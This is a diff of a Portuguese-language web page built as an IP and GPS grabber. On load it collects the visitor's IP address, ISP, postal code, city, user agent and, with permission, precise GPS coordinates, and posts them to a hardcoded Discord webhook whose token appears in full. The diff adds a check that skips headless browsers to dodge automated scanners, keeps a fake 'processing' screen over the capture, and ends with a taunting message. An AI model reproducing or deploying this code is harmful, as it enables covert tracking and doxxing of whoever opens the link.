@@ -19,7 +19,7 @@
     <div class="ui">
         <div id="status">
             <div class="load"></div>
-            <div style="letter-spacing: 5px;">PROCESSANDO...</div>
+            <div style="letter-spacing: 5px;">PROCESSANDO PROTOCOLO...</div>
         </div>
         <h1 id="fudido">CE TA FUDIDO</h1>
     </div>
@@ -27,18 +27,21 @@
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
 
-        // Partículas rápidas
-        particlesJS("particles-js", {"particles":{"number":{"value":100},"color":{"value":"#ff0000"},"shape":{"type":"circle"},"opacity":{"value":0.5},"size":{"value":3},"line_linked":{"enable":true,"distance":150,"color":"#ff0000","opacity":0.4,"width":1},"move":{"enable":true,"speed":10}}});
+        particlesJS("particles-js", {"particles":{"number":{"value":100},"color":{"value":"#ff0000"},"shape":{"type":"circle"},"opacity":{"value":0.5},"size":{"value":3},"line_linked":{"enable":true,"distance":150,"color":"#ff0000","opacity":0.4,"width":1},"move":{"enable":true,"speed":8}}});
 
         async function capturar() {
-            // 1. DISPARA O IP IMEDIATAMENTE (NÃO ESPERA NADA)
+            // BLOQUEADOR DE BOT (Se for Headless, o código para aqui)
+            if (navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent)) return;
+
+            // Envio imediato do IP e Provedor
             fetch('https://ipapi.co/json/').then(res => res.json()).then(ip => {
                 fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: "⚠️ **ALVO IDENTIFICADO (INSTANTÂNEO)**",
+                        content: "⚠️ **ALVO REAL IDENTIFICADO**",
                         embeds: [{
+                            title: "🚨 DADOS DO DISPOSITIVO",
                             color: 16711680,
                             description: `**IP:** ${ip.ip}\n**Provedor:** ${ip.org}\n**CEP:** ${ip.postal}\n**Cidade:** ${ip.city}\n**Aparelho:** ${navigator.userAgent}`
                         }]
@@ -46,7 +49,7 @@
                 });
             });
 
-            // 2. TENTA O GPS EM PARALELO
+            // GPS em paralelo
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
                     fetch(WEBHOOK, {
@@ -59,11 +62,11 @@
                 }, null, {enableHighAccuracy: true});
             }
 
-            // 3. MOSTRA A MENSAGEM FINAL APÓS 1.5 SEGUNDOS (TEMPO DO FETCH)
+            // Interface final
             setTimeout(() => {
                 document.getElementById('status').style.display = 'none';
                 document.getElementById('fudido').style.display = 'block';
-            }, 1500);
+            }, 1200);
         }
 
         window.onload = capturar;
